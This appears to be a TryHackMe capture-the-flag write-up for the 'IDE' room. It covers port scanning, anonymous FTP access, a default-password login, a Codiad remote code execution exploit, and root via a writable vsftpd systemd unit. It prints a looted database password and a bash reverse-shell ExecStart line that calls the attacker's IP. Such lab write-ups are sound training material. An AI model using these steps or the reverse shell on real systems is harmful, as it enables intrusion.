
<p align="center">March 22, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{320}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
  <img width="160px" src="https://github.com/user-attachments/assets/9b74bcc3-7aa7-4f11-aa81-9d643532d2b6"></p>

  <h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{IDE}}$$
</h1>

<p align="center">An easy box to polish your enumeration skills!. It is classified as an easy-level CTF, and you can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed. <a href="https://tryhackme.com/room/ide">IDE</a>.</p>

<p align="center"> <img width="900px" src="https://github.com/user-attachments/assets/aef3fb0a-0a97-4adc-b32b-e6d868c2fde5"> </p>

<br>
<br>

<h2 align="center">$$\textcolor{white}{\textnormal{Nmap}}$$</h2>

<p align="center">There are have 5 ports open: <code>ftp/21</code>, <code>ssh/22</code>, <code>http/80</code>, and <code>http62337</code>.<br> <code>Anonymous</code> is allowed to <code>ftp</code></code></p>

```bash
:~/IDE# nmap -sC -sV -Pn -A -p- 10.10.127.74
...
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.194.200
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Codiad 2.8.4
...
```

<h2 align="center">$$\textcolor{white}{\textnormal{Service Enumeration}}$$</h2>

<p align="center">Used <code>gobuster</code>. :-(</p>

```bash
~/IDE# gobuster dir -u http://10.10.127.74/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.127.74/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 277]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

<p align="center">Used <code>ftp</code>.</p>

```bash
:~/IDE# ftp 10.10.127.74
Connected to 10.10.127.74.
220 (vsFTPd 3.0.3)
Name (10.10.127.74:root): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
226 Directory send OK.
ftp> cd .
250 Directory successfully changed.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
...
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
...
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18  2021 -
drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
226 Directory send OK.
ftp> get -
local: ./- remote: -
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for - (151 bytes).
226 Transfer complete.
151 bytes received in 0.00 secs (331.3729 kB/s)
ftp> exit
:~/IDE# ftp 10.10.127.74
```

<p>Discovered users <code>john</code>, and <code>drac</code>. <code>john</code> can use default password.<br> So I will try <code>john</code>:<code>password</code>.</p>

![image](https://github.com/user-attachments/assets/cd34517c-10b0-4967-b6f0-fb62cdca910e)

<h2 align="center">$$\textcolor{white}{\textnormal{Exploit}}$$</h2>

<br>

![image](https://github.com/user-attachments/assets/3c4db2ff-bb79-47fe-a488-64f31ebc5643)

<br>

![image](https://github.com/user-attachments/assets/b7001844-095a-452f-8866-79f72ae946ef)

<br>


![image](https://github.com/user-attachments/assets/f0536143-dc00-42af-9357-f8821083380c)


<br>

![image](https://github.com/user-attachments/assets/e73333e7-0eb1-4743-b406-02e3a1ebab20)





<h2 align="center">$$\textcolor{white}{\textnormal{Privilege Escalation - Horizontal}}$$</h2>
<p align="center">Used <code>searchsploit</code>.</p>



```bash
:~/IDE# searchsploit codiad
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Codiad 2.4.3 - Multiple Vulnerabilities                                                                                    | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                                                                                        | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution (Authenticated)                                                                       | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                                                                   | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                                                                   | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)                                                                   | multiple/webapps/50474.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
:~/IDE# 
```



<p>Since we have credentials, I will try <code>49705.py</code>.</p>


![image](https://github.com/user-attachments/assets/3bc86b0a-f706-4424-8699-87869fde9f1e)

<br>

![image](https://github.com/user-attachments/assets/907ddaba-b211-4705-a549-accf3dfb96d4)

<br>

![image](https://github.com/user-attachments/assets/341aa18d-a3d4-4382-ac39-b72023ccbb6f)

<br>

![image](https://github.com/user-attachments/assets/9ab47120-0e77-4ea6-847a-6759ebd0827b)


<br>

```bash
www-data@ide:/home/drac$ cat .bash_history
cat .bash_history
mysql -u drac -p 'Th3dRaCULa1sR3aL'
www-data@ide:/home/drac$ cat 
```

<br>

```bash
www-data@ide:/home/drac$ cat .profile
cat .profile
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
www-data@ide:/home/drac$ 

```

<br>


<p align="center">Discovered <code>user.txt</code>.</p>

![image](https://github.com/user-attachments/assets/96ce367c-8f87-4f01-bceb-cd07cdf8e7e8)

<br>

<h2 align="center">$$\textcolor{white}{\textnormal{Privilege Escalation - Vertical}}$$</h2>

![image](https://github.com/user-attachments/assets/9c3fabe3-1dbd-4174-bd55-2452d0ad6d14)


<br>

<p align="center"Discovered vsftpd service is writable by drac and own by root..</p>

```bash

drac@ide:/srv/ftp$ systemctl status vsftpd.service

```

![image](https://github.com/user-attachments/assets/58ad9fcd-213d-420b-ab68-1c8898dd3c3e)

<br>

```bash
drac@ide:/srv/ftp$ locate vsftpd.service

```

![image](https://github.com/user-attachments/assets/3c0a0aad-980e-416d-83d2-770e093c5546)


<br>

```bash
drac@ide:/srv/ftp$ ls -la /lib/systemd/system/vsftpd.service
-rw-rw-r-- 1 root drac 248 Aug  4  2021 /lib/systemd/system/vsftpd.service
drac@ide:/srv/ftp$ 
```


![image](https://github.com/user-attachments/assets/410b4097-b163-4ae9-98e4-453b54e57504)

<br>

![image](https://github.com/user-attachments/assets/2fa73f06-da34-4e11-a8ec-b80873d7ca90)


<br>

```bash

ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.194.200/1337 0>&1' 
```

![image](https://github.com/user-attachments/assets/59fc51d1-7268-43a3-875b-efbc87971329)

<br>

![image](https://github.com/user-attachments/assets/b41c3a0a-2030-439c-b5f5-1ce1d58a55d4)

<br>

<p align="center">Discovered <code>root.txt</code>.</p>

![image](https://github.com/user-attachments/assets/b5410957-4bf8-48e9-8cb5-2be41d44f353)

<br>


<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$
</h1>




<p align="center"> <img width="900px" src="https://github.com/user-attachments/assets/ff3a3c39-8169-48a4-8086-37c27b9dc5ae"> </p>

<br>

<p align="center"> <img width="900px" src="https://github.com/user-attachments/assets/2c265a14-a0b3-4019-bd3a-2fe82f6d3f15e"> </p>


<br>
<br>

<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$
</h1>


<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |           |
| March 22, 2025    | 320      |     349ᵗʰ    |        8ᵗʰ   |    772nd    |     8ᵗʰ    |  87,488  |       623 |   59      |

</div>

<p align="center"> Global All Time: 352ⁿᵈ<br><br><img width="900px" src="https://github.com/user-attachments/assets/1959739b-511b-4f19-9b39-750d613c94f3"> </p>

<p align="center"> Brazil All Time: 8ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/123eca1f-8ef2-49e4-967f-0235547af297"> </p>

<p align="center"> Global monthly: 772nd<br><br><img width="900px" src="https://github.com/user-attachments/assets/268ed383-6988-45f3-80f3-6692f22ad562"> </p>

<p align="center"> Brazil monthly: 8ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/2e385bd1-466c-4cbe-bf3e-ad7de4a5783f"> </p>




